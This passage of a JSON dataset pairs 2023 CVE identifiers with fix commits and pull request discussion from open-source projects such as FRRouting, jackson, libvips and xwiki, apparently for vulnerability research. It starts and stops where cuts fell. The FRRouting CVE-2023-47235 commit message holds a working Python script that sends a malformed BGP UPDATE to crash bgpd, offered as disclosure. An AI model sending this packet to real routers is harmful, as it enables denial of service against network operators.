            "commit_msg": "Fix oobread in the java disassembler ##asan\n\n* Causes UB when performing analysis, not exploitable\n* https://huntr.com/bounties/bbfe1f76-8fa1-4a8c-909d-65b16e970be0/\n* Reported by @gandalf4a",
            "commit_msg_words": 21,
            "other_info": "Fix sign underflow not fitting in cast for java (UB)",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2023-3894",
            "commit_url": "https://github.com/FasterXML/jackson-dataformats-text/commit/20a209387931dba31e1a027b74976911c3df39fe",
            "commit_msg": "reorder code",
            "commit_msg_words": 2,
            "other_info": "TOML: check nesting depth this seems like a better fix than #395. the only thing i'm concerned about is the difference of toml to the other formats. someone using only the streaming apis might set the max stream depth fairly high because they think they cannot run into the data binding issues it exists to avoid. however with toml, the depth limit is critical for streaming as well (since there is no real streaming for toml), not just for binding.\r\n\r\nbut this is probably not a realistic issue, so this still seems superior. @pjfanning i dont think the nesting check is necessary? it should be caught by the parser, every start token will have a pollExpected with the corresponding end token @yawkat I'll probably remove the check. I just wanted to see if there were any existing tests where the depth misbehaves. I'll leave the check there for the moment but as I say, I'm likely to remove it before merging. maybe it can be an `assert` and oss-fuzz can tell us if there's any case where my assumption is violated :) LGTM, but wanted to make sure this is to be merged -- anything else to wait for, change? LMK and I'll  merge it to 2.15, master. it's ok to merge - I'll follow up with more tests in another PR Ok managed to merge to `master`; was bit hairy but all tests pass so I think that's ok.",
            "pr_title_words": 4,
            "comments_words": 236,
            "total_other_info_words": 240
        },
        {
            "cve-id": "CVE-2023-47235",
            "commit_url": "https://github.com/FRRouting/frr/commit/6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
            "commit_msg": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
            "commit_msg_words": 169,
            "other_info": "bgpd: A couple more bgpd crash fixes for malformed packets  @Mergifyio backport dev/9.1 > backport dev/9.1\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14735 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14735) has been created for branch `dev/9.1`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> Is there a plan for a stable/9.0 backport, too? @Mergifyio backport stable/9.0 > backport stable/9.0\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#14861 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14861) has been created for branch `stable/9.0`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n--> @Mergifyio backport stable/8.4 > backport stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#15930 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/15930) has been created for branch `stable/8.4` but encountered conflicts\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 10,
            "comments_words": 177,
            "total_other_info_words": 187
        },
        {
            "cve-id": "CVE-2023-48105",
            "commit_url": "https://github.com/bytecodealliance/wasm-micro-runtime/commit/4785d91b16dd49c09a96835de2d9c7b077543fa4",
            "commit_msg": "Add more buf boundary checks in wasm loader",
            "commit_msg_words": 8,
            "other_info": "Add more buffer boundary checks in wasm loader",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-49464",
            "commit_url": "https://github.com/strukturag/libheif/commit/2bf226a300951e6897ee7267d0dd379ba5ad7287",
            "commit_msg": "uncompressed: protect against broken uncC box component references",
            "commit_msg_words": 8,
            "other_info": "uncompressed: protect against broken uncC box component references",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-37457",
            "commit_url": "https://github.com/asterisk/asterisk/commit/a1ca0268254374b515fa5992f01340f7717113fa",
            "commit_msg": "res_pjsip_header_funcs: Duplicate new header value, don't copy.\n\nWhen updating an existing header the 'update' code incorrectly\njust copied the new value into the existing buffer. If the\nnew value exceeded the available buffer size memory outside\nof the buffer would be written into, potentially causing\na crash.\n\nThis change makes it so that the 'update' now duplicates\nthe new header value instead of copying it into the existing\nbuffer.",
            "commit_msg_words": 69,
            "other_info": "res_pjsip_header_funcs: Duplicate new header value, don't copy. cherry-pick-to: 18\r\ncherry-pick-to: 20\r\ncherry-pick-to: 21\r\ncherry-pick-to: certified/18.9 cherry-pick-test Successfully merged to branch master and cherry-picked to [\"18\",\"20\",\"21\",\"certified/18.9\"]",
            "pr_title_words": 7,
            "comments_words": 18,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2023-32070",
            "commit_url": "https://github.com/xwiki/xwiki-rendering/commit/c40e2f5f9482ec6c3e71dbf1fff5ba8a5e44cdc1",
            "commit_msg": "XRENDERING-663: Restrict allowed attributes in HTML rendering\n\n* Change HTML renderers to only print allowed attributes and elements.\n* Add prefix to forbidden attributes to preserve them in XWiki syntax.\n* Adapt tests to expect that invalid attributes get a prefix.",
            "commit_msg_words": 41,
            "other_info": "XRENDERING-663: Restrict allowed attributes in HTML rendering I'm afraid that totally forbidding some HTML elements even in context where it's not a threat will cause quite a few retro compatibility problems.\r\n\r\nA pity renderers don't support input properties like filters to at least have a way to enable/disable the sanitizer depending on the context. I guess we could use the RenderingContext for that (temporarily disable the sanitizer or set a custom sanitizer in the RenderingContext for the renderer to use). Or make the DefaultHTMLElementSanitizer look at the ExecutionContext for a custom sanitizer hint (the good thing with that solution is that you can set it even in an extension which depends on a version of XWiki where the sanitizer classes don't exist yet since it's just a String key and a String value). I've added a feature to preserve disallowed attributes as attributes with prefix `data-xwiki-translated-attribute-` such that attributes like `latex-template` that are used by the [LaTeX Syntax](https://extensions.xwiki.org/xwiki/bin/view/Extension/LaTeX/Syntax%201.0/#HSpecificCustomTemplates) aren't removed when using the WYSIWYG editor and rebased this PR on top of #217 as otherwise the prefixed attributes aren't preserved.",
            "pr_title_words": 7,
            "comments_words": 173,
            "total_other_info_words": 180
        },
        {
            "cve-id": "CVE-2023-51074",
            "commit_url": "https://github.com/json-path/JsonPath/commit/f49ff25e3bad8c8a0c853058181f2c00b5beb305",
            "commit_msg": "Check for the existence of the next significant bracket",
            "commit_msg_words": 9,
            "other_info": "Check for the existence of the next significant bracket @kallestenflo - just wondering if there will be a new release soon? The CVE this resolves is flagged by our SCA tool and is causing headaches here!  Hi,\r\n\r\nHope to make a release this weekend.\r\n\r\n\r\nOn Fri, Jan 19, 2024 at 12:20\u202fPM adriantcatch ***@***.***>\r\nwrote:\r\n\r\n> @kallestenflo <https://github.com/kallestenflo> - just wondering if there\r\n> will be a new release soon? The CVE this resolves is flagged by our SCA\r\n> tool and is causing headaches here!\r\n>\r\n> \u2014\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/json-path/JsonPath/pull/985#issuecomment-1900224250>,\r\n> or unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/AADNLYRLNF6NVEN6G4XNCUTYPJJHDAVCNFSM6AAAAABB7ZMRA2VHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHMYTSMBQGIZDIMRVGA>\r\n> .\r\n> You are receiving this because you were mentioned.Message ID:\r\n> ***@***.***>\r\n>\r\n Hi, is there an update on a release? Thank you. > Hi, is there an update on a release? Thank you.\n\nYes: https://github.com/json-path/JsonPath/releases/tag/json-path-2.9.0",
            "pr_title_words": 9,
            "comments_words": 135,
            "total_other_info_words": 144
        },
        {
            "cve-id": "CVE-2023-33461",
            "commit_url": "https://github.com/ndevilla/iniparser/commit/ace9871f65d11b5d73f0b9ee8cf5d2807439442d",
            "commit_msg": "Handle null return from iniparser_getstring\n\nFix handling of NULL returns from iniparser_getstring in\niniparser_getboolean, iniparser_getlongint and iniparser_getdouble,\navoiding a crash.",
            "commit_msg_words": 20,
            "other_info": "Handle null return from iniparser_getstring Thanks for providing the fix!",
            "pr_title_words": 5,
            "comments_words": 5,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2023-1495",
            "commit_url": "https://github.com/getrebuild/rebuild/commit/c9474f84e5f376dd2ade2078e3039961a9425da7",
            "commit_msg": "H5 sync2 (#595)\n\n* style: \u76ee\u5f55\u6837\u5f0fgh\r\n\r\n* style: J_new\r\n\r\n* feat: advListFilterTabs\r\n\r\n* feat: nav-copyto\r\n\r\n* enh: \u52a9\u8bb0\u7801\u5168\u62fc\r\n\r\n* enh: \u5730\u56fe\u641c\u7d22\u9009\u70b9\r\n\r\n* enh: topnav\r\n\r\n* list pn\r\n\r\n* .form-line.v33\r\n\r\n* open TAG\r\n\r\n* KVS addShutdownHook\r\n\r\n* fix: #594\r\n\r\n---------\r\n\r\nCo-authored-by: devezhao <zhaofang123@gmail.com>",
            "commit_msg_words": 42,
            "other_info": "H5 sync2",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-33657",
            "commit_url": "https://github.com/nanomq/nanomq/commit/5f57ef45ccfd0f47d815eb62f5f2a619ba7d0633",
            "commit_msg": "* FIX [security] avoid data racing by clone retain msg",
            "commit_msg_words": 10,
            "other_info": "Fix data racing on retain msg",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-2977",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/3bf3ab2f9091f984cda6dd910654ccbbe3f06a40",
            "commit_msg": "pkcs15init: correct left length calculation to fix buffer overrun bug.\nFixes #2785",
            "commit_msg_words": 12,
            "other_info": "pkcs15init: correct left length calculation to fix buffer overrun bug. thank you",
            "pr_title_words": 10,
            "comments_words": 2,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-40032",
            "commit_url": "https://github.com/libvips/libvips/commit/e091d65835966ef56d53a4105a7362cafdb1582b",
            "commit_msg": "svgload: fix null-pointer dereference (#3604)\n\n`g_utf8_find_next_char()` might return NULL when called with a\r\nnon-NULL second argument, indicating that the end of the string\r\nhas been reached.",
            "commit_msg_words": 26,
            "other_info": "svgload: fix null-pointer dereference",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-33973",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/c9d7863e5664a169035038628029bb07e090c5ff",
            "commit_msg": "gnrc_sixlowpan_iphc: fix NULL pointer dereference",
            "commit_msg_words": 5,
            "other_info": "gnrc_sixlowpan_iphc: fix NULL pointer dereference ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci.riot-os.org/details/3be43c81fbb24b2abe89a6e8a482e8e0)\n\nc9d7863e5664a169035038628029bb07e090c5ff gnrc_sixlowpan_iphc: fix NULL pointer dereference\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 6933 | 0 | 6933 | 13m:05s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci.riot-os.org/results/3be43c81fbb24b2abe89a6e8a482e8e0/doc-preview/)\n bors merge bors cancel\r\nbors merge Canceled. Build failed (retrying...):\n  * [Murdock](https://ci.riot-os.org/details/921602a9417d44289c8d9e559aca3c65) `tests/drivers/servo` failed... Looks unrelated Oo It was a timeout during a long rust build, likely caused because cargo fetches are slow now. The exact same thing happened on a different worker before. I think it is caused by upstream repos being a bit slower now then they used to be. But I'd actually blame our lack of caching of remote resources in our CI. Github was very slow the past few days, but only from some ISPs. Maybe it's related. This PR was included in a batch that was canceled, it will be automatically retried   Build succeeded!\n\n  The publicly hosted instance of bors-ng is deprecated and will go away soon.\n\n  If you want to self-host your own instance, [instructions are here][instructions].\n  For more help, visit [the forum].\n\n  If you want to switch to GitHub's built-in merge queue, visit [their help page][gh].\n\n  [instructions]: https://github.com/bors-ng/bors-ng#how-to-set-up-your-own-real-instance\n  [the forum]: https://forum.bors.tech\n  [gh]: https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue\n\n\n\n  * [Murdock](https://ci.riot-os.org/details/fb540a7fea3d482dbf15b594aaf08a39)\n  * [static-tests](https://github.com/RIOT-OS/RIOT/actions/runs/5124347194/jobs/9216073113)\n  * [tools-build-success](https://github.com/RIOT-OS/RIOT/actions/runs/5124347197/jobs/9216103309)",
            "pr_title_words": 5,
            "comments_words": 209,
            "total_other_info_words": 214
        },
        {
            "cve-id": "CVE-2023-23926",
            "commit_url": "https://github.com/neo4j/apoc/commit/3202b421b21973b2f57a43b33c88f3f6901cfd2a",
            "commit_msg": "[AJmycukR] Fix for apoc.import.graphml",
            "commit_msg_words": 4,
            "other_info": "[AJmycukR] Fix for apoc.import.graphml",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-41909",
            "commit_url": "https://github.com/FRRouting/frr/commit/cfd04dcb3e689754a72507d086ba3b9709fc5ed8",
            "commit_msg": "bgpd: Limit flowspec to no attribute means a implicit withdrawal\n\nAll other parsing functions done from bgp_nlri_parse() assume\nno attributes == an implicit withdrawal.  Let's move\nbgp_nlri_parse_flowspec() into the same alignment.\n\nReported-by: Matteo Memelli <mmemelli@amazon.it>\nSigned-off-by: Donald Sharp <sharpd@nvidia.com>",
            "commit_msg_words": 39,
            "other_info": "Limit scope <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Ubuntu 16.04 amd64 build: Failed (click for details)</summary>\nUbuntu 16.04 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI014BUILD/frr.xref.xz/frr.xref.xz\nUbuntu 16.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI014BUILD/config.log/config.log.gz\nUbuntu 16.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI014BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Ubuntu 16.04 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI014BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>FreeBSD 12 amd64 build: Failed (click for details)</summary>\nFreeBSD 12 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/FBSD12AMD64/frr.xref.xz/frr.xref.xz\nFreeBSD 12 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/FBSD12AMD64/config.log/config.log.gz\nFreeBSD 12 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/FBSD12AMD64/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for FreeBSD 12 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/FBSD12AMD64/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\nUbuntu 16.04 arm8 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U16ARM8BUILD/frr.xref.xz/frr.xref.xz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U16ARM8BUILD/config.status/config.status\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U16ARM8BUILD/config.log/config.log.gz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 16.04 arm8 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U16ARM8BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Ubuntu 18.04 i386 build: Failed (click for details)</summary>\n\n__DejaGNU Unittests (make check) failed for Ubuntu 18.04 i386 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18I386BUILD/ErrorLog/log_pytests.txt\nUbuntu 18.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18I386BUILD/config.status/config.status\nUbuntu 18.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18I386BUILD/config.log/config.log.gz\nUbuntu 18.04 i386 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18I386BUILD/frr.xref.xz/frr.xref.xz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\nUbuntu 18.04 arm7 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM7BUILD/frr.xref.xz/frr.xref.xz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM7BUILD/config.status/config.status\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM7BUILD/config.log/config.log.gz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 18.04 arm7 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM7BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM8BUILD/frr.xref.xz/frr.xref.xz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 18.04 arm8 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM8BUILD/ErrorLog/log_pytests.txt\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM8BUILD/config.log/config.log.gz\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U18ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB11AMD64/config.log/config.log.gz\n\n__DejaGNU Unittests (make check) failed for Debian 11 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB11AMD64/ErrorLog/log_pytests.txt\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB11AMD64/config.status/config.status\nDebian 11 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB11AMD64/frr.xref.xz/frr.xref.xz\n</details>\n<details>\n<summary>Ubuntu 16.04 i386 build: Failed (click for details)</summary>\nUbuntu 16.04 i386 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1604I386/frr.xref.xz/frr.xref.xz\nUbuntu 16.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1604I386/config.log/config.log.gz\nUbuntu 16.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1604I386/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Ubuntu 16.04 i386 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1604I386/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Redhat 8 amd64 build: Failed (click for details)</summary>\nRedhat 8 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/REDHAT8/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Redhat 8 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/REDHAT8/ErrorLog/log_pytests.txt\nRedhat 8 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/REDHAT8/config.log/config.log.gz\nRedhat 8 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/REDHAT8/frr.xref.xz/frr.xref.xz\n</details>\n<details>\n<summary>Debian 10 amd64 build: Failed (click for details)</summary>\nDebian 10 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB10BUILD/frr.xref.xz/frr.xref.xz\nDebian 10 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB10BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Debian 10 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB10BUILD/ErrorLog/log_pytests.txt\nDebian 10 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/DEB10BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>OpenBSD 7 amd64 build: Failed (click for details)</summary>\nOpenBSD 7 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI011BUILD/frr.xref.xz/frr.xref.xz\nOpenBSD 7 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI011BUILD/config.log/config.log.gz\nOpenBSD 7 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI011BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for OpenBSD 7 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI011BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI009BUILD/config.log/config.log.gz\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI009BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for FreeBSD 11 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI009BUILD/ErrorLog/log_pytests.txt\nFreeBSD 11 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI009BUILD/frr.xref.xz/frr.xref.xz\n</details>\n<details>\n<summary>Ubuntu 22.04 amd64 build: Failed (click for details)</summary>\nUbuntu 22.04 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U22AMD64BUILD/frr.xref.xz/frr.xref.xz\nUbuntu 22.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U22AMD64BUILD/config.log/config.log.gz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 22.04 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U22AMD64BUILD/ErrorLog/log_pytests.txt\nUbuntu 22.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U22AMD64BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 20.04 amd64 build: Failed (click for details)</summary>\nUbuntu 20.04 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U2004AMD64BUILD/frr.xref.xz/frr.xref.xz\nUbuntu 20.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U2004AMD64BUILD/config.log/config.log.gz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 20.04 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U2004AMD64BUILD/ErrorLog/log_pytests.txt\nUbuntu 20.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U2004AMD64BUILD/config.status/config.status\n</details>\n<details>\n<summary>Debian 9 amd64 build: Failed (click for details)</summary>\nDebian 9 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI021BUILD/frr.xref.xz/frr.xref.xz\nDebian 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI021BUILD/config.log/config.log.gz\nDebian 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI021BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Debian 9 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI021BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>CentOS 7 amd64 build: Failed (click for details)</summary>\nCentOS 7 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI005BUILD/frr.xref.xz/frr.xref.xz\nCentOS 7 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI005BUILD/config.log/config.log.gz\nCentOS 7 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI005BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for CentOS 7 amd64 build__\n   see 